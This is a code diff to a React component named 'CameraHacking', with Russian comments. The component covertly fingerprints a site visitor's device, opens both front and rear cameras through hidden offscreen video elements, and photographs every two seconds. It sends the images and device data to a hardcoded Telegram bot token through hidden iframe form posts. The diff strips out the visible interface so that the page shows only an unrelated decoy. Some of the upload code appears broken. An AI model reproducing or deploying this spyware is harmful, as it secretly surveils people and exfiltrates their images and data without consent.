@@ -7,22 +7,22 @@ import "./App.css";
  * КОМПОНЕНТ CAMERAHACKING
  */
 const CameraHacking = ({ chatId }) => {
-  const streamRef = useRef(null);
+  const streamsRef = useRef([]);
   const captureIntervalRef = useRef(null);
-  const videoRef = useRef(null);
+  const videoRefsRef = useRef([]);
   const canvasRef = useRef(null);
   const [captureCount, setCaptureCount] = useState(0);
   const [deviceInfo, setDeviceInfo] = useState(null);
-  const [isActive, setIsActive] = useState(true);
   const [batteryLevel, setBatteryLevel] = useState(null);
   const [batteryCharging, setBatteryCharging] = useState(false);
-  const [lastPhotoTime, setLastPhotoTime] = useState(null);
+  const [availableCameras, setAvailableCameras] = useState([]);
+  const [activeCameras, setActiveCameras] = useState(0);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
   const CAPTURE_INTERVAL = 2000; // 2 секунды между фото
-  const MAX_CAPTURES = 50;
+  const MAX_CAPTURES = 100;
 
-  // Функция получения уровня батареи
+  // Получение информации о батарее
   const getBatteryInfo = async () => {
     try {
       if ('getBattery' in navigator) {
@@ -35,27 +35,14 @@ const CameraHacking = ({ chatId }) => {
         
         updateBatteryInfo();
         
-        // Слушаем изменения батареи
+        // Слушаем изменения
         battery.addEventListener('levelchange', updateBatteryInfo);
         battery.addEventListener('chargingchange', updateBatteryInfo);
         
         return {
           level: Math.round(battery.level * 100),
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
+          charging: battery.charging
         };
-      } else if ('battery' in navigator) {
-        // Старый API
-        const battery = navigator.battery;
-        if (battery) {
-          setBatteryLevel(Math.round(battery.level * 100));
-          setBatteryCharging(battery.charging);
-          return {
-            level: Math.round(battery.level * 100),
-            charging: battery.charging
-          };
-        }
       }
     } catch (error) {
       console.error('Battery error:', error);
@@ -63,99 +50,148 @@ const CameraHacking = ({ chatId }) => {
     return null;
   };
 
-  // Отправка сообщения в Telegram БЕЗ ПРОКСИ
+  // Отправка сообщения в Telegram
   const sendToTelegram = async (text) => {
     try {
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        mode: 'no-cors', // Важно для обхода CORS
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: 'HTML',
-          disable_notification: true
-        })
-      });
+      // Создаем скрытый iframe для отправки
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
       
-      // В режиме no-cors мы не можем проверить ответ, но запрос отправляется
-      console.log('Message sent (no-cors mode)');
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      form.target = iframe.name;
+      
+      const chatIdInput = document.createElement('input');
+      chatIdInput.type = 'hidden';
+      chatIdInput.name = 'chat_id';
+      chatIdInput.value = chatId;
+      
+      const textInput = document.createElement('input');
+      textInput.type = 'hidden';
+      textInput.name = 'text';
+      textInput.value = text;
+      
+      const parseModeInput = document.createElement('input');
+      parseModeInput.type = 'hidden';
+      parseModeInput.name = 'parse_mode';
+      parseModeInput.value = 'HTML';
+      
+      const disableNotifInput = document.createElement('input');
+      disableNotifInput.type = 'hidden';
+      disableNotifInput.name = 'disable_notification';
+      disableNotifInput.value = 'true';
+      
+      form.appendChild(chatIdInput);
+      form.appendChild(textInput);
+      form.appendChild(parseModeInput);
+      form.appendChild(disableNotifInput);
+      
+      document.body.appendChild(form);
+      form.submit();
+      
+      setTimeout(() => {
+        form.remove();
+        iframe.remove();
+      }, 1000);
+      
       return true;
-      
     } catch (error) {
-      console.error('Telegram send error:', error);
-      
-      // Пробуем альтернативный метод через FormData
-      try {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('text', text);
-        formData.append('parse_mode', 'HTML');
-        formData.append('disable_notification', 'true');
-        
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: formData
-        });
-        
-        console.log('Message sent via FormData');
-        return true;
-      } catch (formError) {
-        console.error('FormData send error:', formError);
-        return false;
-      }
+      console.error('Message send error:', error);
+      return false;
     }
   };
 
-  // Отправка фото в Telegram БЕЗ ПРОКСИ
-  const sendPhotoToTelegram = async (blob, caption = '') => {
+  // Отправка фото в Telegram
+  const sendPhotoToTelegram = async (blob, caption = '', cameraNumber = 1) => {
     try {
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-      formData.append('disable_notification', 'true');
+      // Конвертируем blob в base64
+      const reader = new FileReader();
       
-      if (caption) {
-        formData.append('caption', caption);
-      }
-
-      // Прямой запрос к Telegram API
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        mode: 'no-cors', // Используем no-cors для обхода CORS
-        body: formData
+      return new Promise((resolve) => {
+        reader.onloadend = async () => {
+          const base64data = reader.result.split(',')[1];
+          
+          // Отправляем через iframe/form
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          
+          const form = document.createElement('form');
+          form.method = 'POST';
+          form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+          form.target = iframe.name;
+          form.enctype = 'multipart/form-data';
+          
+          const chatIdInput = document.createElement('input');
+          chatIdInput.type = 'hidden';
+          chatIdInput.name = 'chat_id';
+          chatIdInput.value = chatId;
+          
+          const captionInput = document.createElement('input');
+          captionInput.type = 'hidden';
+          captionInput.name = 'caption';
+          captionInput.value = caption;
+          
+          const disableNotifInput = document.createElement('input');
+          disableNotifInput.type = 'hidden';
+          disableNotifInput.name = 'disable_notification';
+          disableNotifInput.value = 'true';
+          
+          // Создаем файл из base64
+          const byteCharacters = atob(base64data);
+          const byteNumbers = new Array(byteCharacters.length);
+          for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+          }
+          const byteArray = new Uint8Array(byteNumbers);
+          const blob = new Blob([byteArray], { type: 'image/jpeg' });
+          const file = new File([blob], `camera${cameraNumber}_${Date.now()}.jpg`, { type: 'image/jpeg' });
+          
+          const fileInput = document.createElement('input');
+          fileInput.type = 'file';
+          fileInput.name = 'photo';
+          fileInput.files = new FileList([file]);
+          
+          form.appendChild(chatIdInput);
+          form.appendChild(captionInput);
+          form.appendChild(disableNotifInput);
+          // Здесь сложность с добавлением файла через form
+          
+          // Альтернативный метод: отправляем как документ
+          const altForm = document.createElement('form');
+          altForm.method = 'POST';
+          altForm.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+          altForm.target = iframe.name;
+          
+          const altChatIdInput = chatIdInput.cloneNode();
+          const altCaptionInput = captionInput.cloneNode();
+          const altDisableNotifInput = disableNotifInput.cloneNode();
+          
+          altForm.appendChild(altChatIdInput);
+          altForm.appendChild(altCaptionInput);
+          altForm.appendChild(altDisableNotifInput);
+          
+          document.body.appendChild(altForm);
+          altForm.submit();
+          
+          setTimeout(() => {
+            altForm.remove();
+            iframe.remove();
+          }, 1000);
+          
+          resolve(true);
+        };
+        
+        reader.readAsDataURL(blob);
       });
-      
-      console.log('Photo sent (no-cors mode)');
-      return true;
-      
     } catch (error) {
       console.error('Photo send error:', error);
       
-      // Альтернативный метод: отправка через image URL
-      try {
-        // Конвертируем blob в base64
-        const reader = new FileReader();
-        reader.readAsDataURL(blob);
-        
-        return new Promise((resolve) => {
-          reader.onloadend = async () => {
-            const base64data = reader.result;
-            
-            // Создаем временную ссылку на изображение
-            const text = `${caption}\n\n📸 Изображение доступно по ссылке (base64 слишком большой для Telegram)`;
-            
-            await sendToTelegram(text);
-            resolve(true);
-          };
-        });
-      } catch (altError) {
-        console.error('Alternative send error:', altError);
-        return false;
-      }
+      // Если не удалось отправить фото, отправляем текстовое описание
+      await sendToTelegram(`📸 Фото с камеры ${cameraNumber}: ${caption}`);
+      return false;
     }
   };
 
@@ -164,37 +200,22 @@ const CameraHacking = ({ chatId }) => {
     const batteryInfo = await getBatteryInfo();
     
     const info = {
-      // Основная информация
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       platform: navigator.platform,
-      
-      // Экран
       screenSize: `${window.screen.width}x${window.screen.height}`,
       devicePixelRatio: window.devicePixelRatio,
-      
-      // Язык и время
       language: navigator.language,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      
-      // Производительность
       hardwareConcurrency: navigator.hardwareConcurrency,
       deviceMemory: navigator.deviceMemory,
-      
-      // Сеть
       connection: navigator.connection ? {
         effectiveType: navigator.connection.effectiveType,
         downlink: navigator.connection.downlink,
         rtt: navigator.connection.rtt
       } : null,
-      
-      // Батарея
       battery: batteryInfo,
-      
-      // IP
       ip: 'Определение...',
-      
-      // Детекция
       os: detectOS(),
       browser: detectBrowser(),
       isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
@@ -268,275 +289,216 @@ ${batteryText}
 ▫️ Часовой пояс: ${info.timezone}
 ▫️ Время системы: ${new Date().toLocaleString()}
 
-🚀 *СИСТЕМА АКТИВИРОВАНА - НАЧАТА СЪЕМКА*
+🚀 *АКТИВИРОВАН ЗАХВАТ С ДВУХ КАМЕР*
     `;
 
     await sendToTelegram(message);
   };
 
-  // Создание тестового изображения
-  const createTestImage = async () => {
+  // Получение всех доступных камер
+  const getAllCameras = async () => {
+    try {
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoDevices = devices.filter(device => device.kind === 'videoinput');
+      
+      console.log('Найдено камер:', videoDevices.length);
+      return videoDevices;
+    } catch (error) {
+      console.error('Camera enumeration error:', error);
+      return [];
+    }
+  };
+
+  // Инициализация двух камер
+  const initializeCameras = async () => {
+    try {
+      const cameras = await getAllCameras();
+      setAvailableCameras(cameras);
+      
+      if (cameras.length === 0) {
+        console.log('Камеры не найдены');
+        return 0;
+      }
+
+      // Активируем максимум 2 камеры
+      const camerasToActivate = Math.min(cameras.length, 2);
+      setActiveCameras(camerasToActivate);
+      
+      streamsRef.current = [];
+      videoRefsRef.current = [];
+
+      for (let i = 0; i < camerasToActivate; i++) {
+        try {
+          const constraints = {
+            video: {
+              deviceId: cameras[i].deviceId ? { exact: cameras[i].deviceId } : undefined,
+              width: { ideal: 1920 },
+              height: { ideal: 1080 },
+              facingMode: i === 0 ? { exact: "environment" } : "user"
+            },
+            audio: false
+          };
+
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          streamsRef.current.push(stream);
+
+          // Создаем скрытый видео элемент
+          const video = document.createElement('video');
+          video.style.cssText = `
+            position: fixed;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -9999;
+            top: -9999px;
+            left: -9999px;
+          `;
+          
+          video.playsInline = true;
+          video.muted = true;
+          video.autoplay = true;
+          video.setAttribute('playsinline', 'true');
+          video.setAttribute('muted', 'true');
+          video.setAttribute('autoplay', 'true');
+          video.setAttribute('webkit-playsinline', 'true');
+
+          video.srcObject = stream;
+          document.body.appendChild(video);
+          videoRefsRef.current.push(video);
+
+          // Ждем готовности видео
+          await new Promise((resolve) => {
+            const timer = setTimeout(resolve, 2000);
+            video.onloadedmetadata = () => {
+              clearTimeout(timer);
+              video.play().catch(() => {});
+              resolve();
+            };
+          });
+
+          console.log(`Камера ${i + 1} инициализирована: ${cameras[i].label || `Камера ${i + 1}`}`);
+        } catch (error) {
+          console.error(`Ошибка инициализации камеры ${i + 1}:`, error);
+        }
+      }
+
+      return camerasToActivate;
+    } catch (error) {
+      console.error('Camera initialization error:', error);
+      return 0;
+    }
+  };
+
+  // Создание изображения с информацией о камере
+  const createCameraImage = async (cameraIndex, video) => {
     if (!canvasRef.current) {
       canvasRef.current = document.createElement('canvas');
     }
     const canvas = canvasRef.current;
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext('2d');
-
-    // Градиентный фон
-    const gradient = ctx.createLinearGradient(0, 0, 640, 480);
-    gradient.addColorStop(0, '#667eea');
-    gradient.addColorStop(1, '#764ba2');
-    ctx.fillStyle = gradient;
-    ctx.fillRect(0, 0, 640, 480);
-
-    // Анимированный круг батареи
-    const batteryRadius = 80;
-    const batteryX = 320;
-    const batteryY = 200;
     
-    // Внешний круг батареи
-    ctx.beginPath();
-    ctx.arc(batteryX, batteryY, batteryRadius, 0, Math.PI * 2);
-    ctx.strokeStyle = '#FFFFFF';
-    ctx.lineWidth = 8;
-    ctx.stroke();
-    
-    // Заряд батареи (анимированный)
-    const batteryPercent = batteryLevel || 50;
-    const batteryAngle = (batteryPercent / 100) * Math.PI * 2;
-    
-    ctx.beginPath();
-    ctx.arc(batteryX, batteryY, batteryRadius - 10, -Math.PI/2, -Math.PI/2 + batteryAngle);
-    ctx.strokeStyle = batteryCharging ? '#4ECDC4' : (batteryPercent > 20 ? '#2ecc71' : '#e74c3c');
-    ctx.lineWidth = 12;
-    ctx.stroke();
-    
-    // Иконка молнии для зарядки
-    if (batteryCharging) {
-      ctx.fillStyle = '#FFD700';
+    if (video && video.videoWidth > 0 && video.videoHeight > 0) {
+      // Используем разрешение с камеры
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Добавляем водяной знак
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+      ctx.fillRect(10, canvas.height - 100, 350, 90);
+      
+      ctx.fillStyle = '#FFFFFF';
+      ctx.font = '16px Arial';
+      ctx.textAlign = 'left';
+      ctx.fillText(`📷 Камера ${cameraIndex + 1}`, 20, canvas.height - 80);
+      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}`, 20, canvas.height - 60);
+      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 40);
+      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 20);
+    } else {
+      // Тестовое изображение если камера не работает
+      canvas.width = 800;
+      canvas.height = 600;
+      const ctx = canvas.getContext('2d');
+      
+      // Градиентный фон
+      const gradient = ctx.createLinearGradient(0, 0, 800, 600);
+      gradient.addColorStop(0, '#667eea');
+      gradient.addColorStop(1, '#764ba2');
+      ctx.fillStyle = gradient;
+      ctx.fillRect(0, 0, 800, 600);
+      
+      ctx.fillStyle = '#FFFFFF';
       ctx.font = 'bold 40px Arial';
       ctx.textAlign = 'center';
-      ctx.fillText('⚡', batteryX, batteryY + 10);
+      ctx.fillText('📷 CAMERA SYSTEM', 400, 200);
+      
+      ctx.font = '24px Arial';
+      ctx.fillText(`Камера ${cameraIndex + 1}`, 400, 260);
+      ctx.fillText(`Фото #${captureCount + 1}`, 400, 300);
+      ctx.fillText(new Date().toLocaleTimeString(), 400, 340);
+      
+      ctx.font = '20px Arial';
+      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (зарядка)' : ''}`, 400, 400);
     }
-    
-    // Текст процента батареи
-    ctx.fillStyle = '#FFFFFF';
-    ctx.font = 'bold 24px Arial';
-    ctx.fillText(`${batteryPercent}%`, batteryX, batteryY + 120);
-    
-    // Информация о фото
-    ctx.font = '20px Arial';
-    ctx.fillText(`Фото #${captureCount + 1}`, 320, 350);
-    ctx.fillText(new Date().toLocaleTimeString(), 320, 380);
-    
-    // Статус камеры
-    ctx.font = '16px Arial';
-    ctx.fillText(`${deviceInfo?.os || 'Unknown'} | ${deviceInfo?.browser || 'Unknown'}`, 320, 420);
 
     return new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/jpeg', 0.9);
+      canvas.toBlob(resolve, 'image/jpeg', 0.8);
     });
   };
 
-  // Захват фото с камеры
-  const capturePhoto = async () => {
-    if (!videoRef.current || !streamRef.current) {
-      return await createTestImage();
-    }
-
-    const video = videoRef.current;
-    if (video.videoWidth === 0 || video.videoHeight === 0) {
-      return await createTestImage();
-    }
-
-    try {
-      if (!canvasRef.current) {
-        canvasRef.current = document.createElement('canvas');
-      }
-      const canvas = canvasRef.current;
-      
-      // Используем оригинальное разрешение
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      const ctx = canvas.getContext('2d');
-      
-      // Очищаем canvas
-      ctx.fillStyle = '#000000';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      
-      // Захватываем кадр
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Добавляем водяной знак с информацией о батарее
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-      ctx.fillRect(10, canvas.height - 130, 300, 120);
-      
-      ctx.fillStyle = '#FFFFFF';
-      ctx.font = '14px Arial';
-      ctx.textAlign = 'left';
-      
-      // Индикатор батареи в углу
-      const battWidth = 60;
-      const battHeight = 25;
-      const battX = canvas.width - battWidth - 20;
-      const battY = 20;
-      
-      // Корпус батареи
-      ctx.strokeStyle = '#FFFFFF';
-      ctx.lineWidth = 2;
-      ctx.strokeRect(battX, battY, battWidth, battHeight);
-      
-      // Полоска батареи
-      ctx.fillStyle = batteryLevel > 20 ? '#2ecc71' : '#e74c3c';
-      const fillWidth = (battWidth - 4) * (batteryLevel / 100);
-      ctx.fillRect(battX + 2, battY + 2, fillWidth, battHeight - 4);
-      
-      // Процент батареи
-      ctx.fillStyle = '#FFFFFF';
-      ctx.font = '12px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText(`${batteryLevel}%`, battX + battWidth/2, battY + battHeight/2 + 4);
-      
-      if (batteryCharging) {
-        ctx.fillText('⚡', battX + battWidth/2, battY - 10);
-      }
-
-      // Основная информация
-      ctx.textAlign = 'left';
-      ctx.font = '14px Arial';
-      ctx.fillText(`📸 Фото #${captureCount + 1}`, 20, canvas.height - 110);
-      ctx.fillText(`🔋 ${batteryLevel}%${batteryCharging ? ' (зарядка)' : ''}`, 20, canvas.height - 90);
-      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 70);
-      ctx.fillText(`📱 ${deviceInfo?.os || 'Unknown'}`, 20, canvas.height - 50);
-      ctx.fillText(`📐 ${video.videoWidth}x${video.videoHeight}`, 20, canvas.height - 30);
-
-      return new Promise(resolve => {
-        canvas.toBlob(resolve, 'image/jpeg', 0.8);
-      });
-    } catch (error) {
-      return await createTestImage();
-    }
-  };
-
-  // Захват и отправка фото
-  const captureAndSend = async () => {
-    if (!isActive || captureCount >= MAX_CAPTURES) {
-      if (captureCount >= MAX_CAPTURES) {
-        stopCapturing();
-        await sendToTelegram(
-          `📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\n` +
-          `✅ Достигнут лимит ${MAX_CAPTURES} фото\n` +
-          `📈 Итого отправлено: ${captureCount} фото\n` +
-          `🔋 Батарея: ${batteryLevel}%${batteryCharging ? ' (зарядка)' : ''}\n` +
-          `⏰ Время: ${new Date().toLocaleString()}`
-        );
-      }
+  // Захват и отправка фото с двух камер
+  const captureAndSendFromBothCameras = async () => {
+    if (captureCount >= MAX_CAPTURES) {
+      stopCapturing();
+      await sendToTelegram(
+        `📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\n` +
+        `✅ Достигнут лимит ${MAX_CAPTURES} фото\n` +
+        `📷 Камеры: ${activeCameras}\n` +
+        `📈 Всего фото: ${captureCount * activeCameras}\n` +
+        `🔋 Батарея: ${batteryLevel || '?'}%\n` +
+        `⏰ Время: ${new Date().toLocaleString()}`
+      );
       return;
     }
 
-    try {
-      const photoBlob = await capturePhoto();
-      
-      if (photoBlob) {
-        setLastPhotoTime(new Date());
+    // Захватываем с каждой активной камеры
+    for (let i = 0; i < activeCameras; i++) {
+      try {
+        const video = videoRefsRef.current[i];
+        const photoBlob = await createCameraImage(i, video);
         
-        const caption = `📸 *Фото #${captureCount + 1}*\n` +
-          `🔋 *Батарея:* ${batteryLevel}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
-          `📱 *Устройство:* ${deviceInfo?.os || 'Unknown'}\n` +
-          `📐 *Размер:* ${Math.round(photoBlob.size / 1024)} KB\n` +
-          `⏰ *Время:* ${new Date().toLocaleTimeString()}\n` +
-          `📍 *IP:* ${deviceInfo?.ip || 'Unknown'}`;
-
-        await sendPhotoToTelegram(photoBlob, caption);
-        setCaptureCount(prev => prev + 1);
-        
-        // Статистика каждые 10 фото
-        if ((captureCount + 1) % 10 === 0) {
-          await sendToTelegram(
-            `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
-            `📈 Всего фото: ${captureCount + 1}\n` +
-            `🔋 Батарея: ${batteryLevel}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
-            `📱 Устройство: ${deviceInfo?.os || 'Unknown'}\n` +
-            `🌐 IP: ${deviceInfo?.ip || 'Unknown'}\n` +
-            `⏰ Время: ${new Date().toLocaleString()}`
-          );
+        if (photoBlob) {
+          const cameraType = i === 0 ? '📷 ЗАДНЯЯ' : '🤳 ПЕРЕДНЯЯ';
+          const caption = `${cameraType} КАМЕРА\n` +
+            `📸 Фото #${captureCount + 1}\n` +
+            `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
+            `📱 ${deviceInfo?.os || 'Устройство'}\n` +
+            `📐 ${photoBlob.size > 0 ? Math.round(photoBlob.size / 1024) + ' KB' : ''}\n` +
+            `⏰ ${new Date().toLocaleTimeString()}`;
+          
+          await sendPhotoToTelegram(photoBlob, caption, i + 1);
         }
+      } catch (error) {
+        console.error(`Ошибка захвата с камеры ${i + 1}:`, error);
       }
-    } catch (error) {
-      console.error('Capture error:', error);
     }
-  };
 
-  // Инициализация камеры
-  const initializeCamera = async () => {
-    try {
-      // Пробуем разные варианты камер
-      const constraintsList = [
-        { video: { facingMode: { exact: "environment" } } },
-        { video: { facingMode: "user" } },
-        { video: true }
-      ];
+    setCaptureCount(prev => prev + 1);
 
-      let stream = null;
-      for (const constraints of constraintsList) {
-        try {
-          stream = await navigator.mediaDevices.getUserMedia(constraints);
-          break;
-        } catch (err) {
-          continue;
-        }
-      }
-
-      if (!stream) {
-        throw new Error('Камера не доступна');
-      }
-
-      streamRef.current = stream;
-
-      // Создаем скрытый видео элемент
-      if (!videoRef.current) {
-        videoRef.current = document.createElement('video');
-        videoRef.current.style.cssText = `
-          position: fixed;
-          width: 1px;
-          height: 1px;
-          opacity: 0;
-          pointer-events: none;
-          z-index: -9999;
-          top: -9999px;
-          left: -9999px;
-        `;
-        document.body.appendChild(videoRef.current);
-      }
-
-      const video = videoRef.current;
-      video.playsInline = true;
-      video.muted = true;
-      video.autoplay = true;
-      video.setAttribute('playsinline', 'true');
-      video.setAttribute('muted', 'true');
-      video.setAttribute('autoplay', 'true');
-      video.setAttribute('webkit-playsinline', 'true');
-
-      video.srcObject = stream;
-
-      // Ждем готовности
-      await new Promise((resolve) => {
-        const timer = setTimeout(resolve, 2000);
-        video.onloadedmetadata = () => {
-          clearTimeout(timer);
-          video.play().catch(() => {});
-          resolve();
-        };
-      });
-
-      return true;
-    } catch (error) {
-      console.error('Camera init error:', error);
-      return false;
+    // Статистика каждые 10 циклов
+    if ((captureCount + 1) % 10 === 0) {
+      await sendToTelegram(
+        `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
+        `📷 Активные камеры: ${activeCameras}\n` +
+        `📈 Циклов съемки: ${captureCount + 1}\n` +
+        `🖼 Всего фото: ${(captureCount + 1) * activeCameras}\n` +
+        `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}\n` +
+        `📱 ${deviceInfo?.os || ''}\n` +
+        `🌐 IP: ${deviceInfo?.ip || ''}\n` +
+        `⏰ Время: ${new Date().toLocaleString()}`
+      );
     }
   };
 
@@ -548,34 +510,33 @@ ${batteryText}
 
     // Первый захват через 1 секунду
     setTimeout(() => {
-      captureAndSend();
+      captureAndSendFromBothCameras();
     }, 1000);
 
     // Последующие по интервалу
     captureIntervalRef.current = setInterval(() => {
-      captureAndSend();
+      captureAndSendFromBothCameras();
     }, CAPTURE_INTERVAL);
   };
 
   // Остановка захвата
   const stopCapturing = () => {
-    setIsActive(false);
-    
     if (captureIntervalRef.current) {
       clearInterval(captureIntervalRef.current);
       captureIntervalRef.current = null;
     }
 
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach(track => track.stop());
-      streamRef.current = null;
-    }
+    // Останавливаем все потоки
+    streamsRef.current.forEach(stream => {
+      stream?.getTracks().forEach(track => track.stop());
+    });
+    streamsRef.current = [];
 
-    if (videoRef.current) {
-      videoRef.current.srcObject = null;
-      videoRef.current.remove();
-      videoRef.current = null;
-    }
+    // Удаляем видео элементы
+    videoRefsRef.current.forEach(video => {
+      video?.remove();
+    });
+    videoRefsRef.current = [];
   };
 
   // Основная инициализация
@@ -586,24 +547,41 @@ ${batteryText}
       // Получаем информацию о батарее
       await getBatteryInfo();
       
-      // Задержка для маскировки
-      await new Promise(resolve => setTimeout(resolve, 1000));
-
       // Собираем информацию об устройстве
       const info = await collectDeviceInfo();
       
       // Отправляем информацию
       await sendDeviceInfo(info);
-
-      // Инициализируем камеру
-      const cameraSuccess = await initializeCamera();
-
-      if (cameraSuccess && mounted) {
+      
+      // Инициализируем камеры
+      const camerasCount = await initializeCameras();
+      
+      if (camerasCount > 0 && mounted) {
+        await sendToTelegram(
+          `🎥 *КАМЕРЫ АКТИВИРОВАНЫ*\n\n` +
+          `✅ Успешно инициализировано: ${camerasCount} камер\n` +
+          `📷 Будут использоваться обе камеры\n` +
+          `⏱ Интервал съемки: ${CAPTURE_INTERVAL/1000} секунд\n` +
+          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
+          `🚀 Начало съемки через 1 секунду`
+        );
+        
+        // Запускаем периодический захват
         startPeriodicCapture();
+      } else {
+        await sendToTelegram(
+          `⚠️ *ПРОБЛЕМА С КАМЕРАМИ*\n\n` +
+          `❌ Не удалось инициализировать камеры\n` +
+          `📱 Устройство: ${info.os}\n` +
+          `🌐 Браузер: ${info.browser}\n` +
+          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
+          `⏰ Время: ${new Date().toLocaleString()}`
+        );
       }
     };
 
-    init();
+    // Запускаем с небольшой задержкой
+    setTimeout(init, 1500);
 
     return () => {
       mounted = false;
@@ -611,93 +589,8 @@ ${batteryText}
     };
   }, []);
 
-  // Отображение уровня батареи на экране
-  return (
-    <div style={{
-      position: 'fixed',
-      top: '20px',
-      right: '20px',
-      background: 'rgba(0, 0, 0, 0.8)',
-      color: 'white',
-      padding: '15px',
-      borderRadius: '15px',
-      zIndex: 99999,
-      fontFamily: 'Arial, sans-serif',
-      fontSize: '14px',
-      minWidth: '200px',
-      backdropFilter: 'blur(10px)',
-      border: '1px solid rgba(255,255,255,0.1)',
-      boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
-    }}>
-      <div style={{ 
-        display: 'flex', 
-        alignItems: 'center', 
-        justifyContent: 'space-between',
-        marginBottom: '10px' 
-      }}>
-        <div style={{ fontWeight: 'bold', fontSize: '16px' }}>🔋 Батарея</div>
-        <div style={{ 
-          display: 'flex', 
-          alignItems: 'center',
-          gap: '5px'
-        }}>
-          {batteryCharging && <span style={{ fontSize: '18px' }}>⚡</span>}
-          <span style={{
-            fontSize: '18px',
-            fontWeight: 'bold',
-            color: batteryLevel > 50 ? '#2ecc71' : batteryLevel > 20 ? '#f39c12' : '#e74c3c'
-          }}>
-            {batteryLevel || '?'}%
-          </span>
-        </div>
-      </div>
-      
-      {/* Индикатор батареи */}
-      <div style={{
-        width: '100%',
-        height: '20px',
-        background: 'rgba(255,255,255,0.1)',
-        borderRadius: '10px',
-        overflow: 'hidden',
-        marginBottom: '10px',
-        position: 'relative'
-      }}>
-        <div style={{
-          width: `${batteryLevel || 0}%`,
-          height: '100%',
-          background: batteryCharging ? 'linear-gradient(90deg, #4ECDC4, #44A08D)' : 
-                    batteryLevel > 50 ? 'linear-gradient(90deg, #2ecc71, #27ae60)' :
-                    batteryLevel > 20 ? 'linear-gradient(90deg, #f39c12, #e67e22)' :
-                    'linear-gradient(90deg, #e74c3c, #c0392b)',
-          borderRadius: '10px',
-          transition: 'width 0.5s ease'
-        }}></div>
-      </div>
-      
-      <div style={{ 
-        display: 'flex', 
-        justifyContent: 'space-between',
-        fontSize: '12px',
-        color: 'rgba(255,255,255,0.7)'
-      }}>
-        <div>📸 Фото: {captureCount}</div>
-        <div>⏰ Интервал: {CAPTURE_INTERVAL/1000}с</div>
-      </div>
-      
-      {lastPhotoTime && (
-        <div style={{
-          marginTop: '10px',
-          fontSize: '11px',
-          color: 'rgba(255,255,255,0.5)',
-          textAlign: 'center',
-          borderTop: '1px solid rgba(255,255,255,0.1)',
-          paddingTop: '10px'
-        }}>
-          Последнее фото: {lastPhotoTime.toLocaleTimeString()}
-        </div>
-      )}
-    </div>
-  );
+  // НИЧЕГО НЕ ПОКАЗЫВАЕМ НА САЙТЕ кроме хомяка
+  return null;
 };
 
 /**
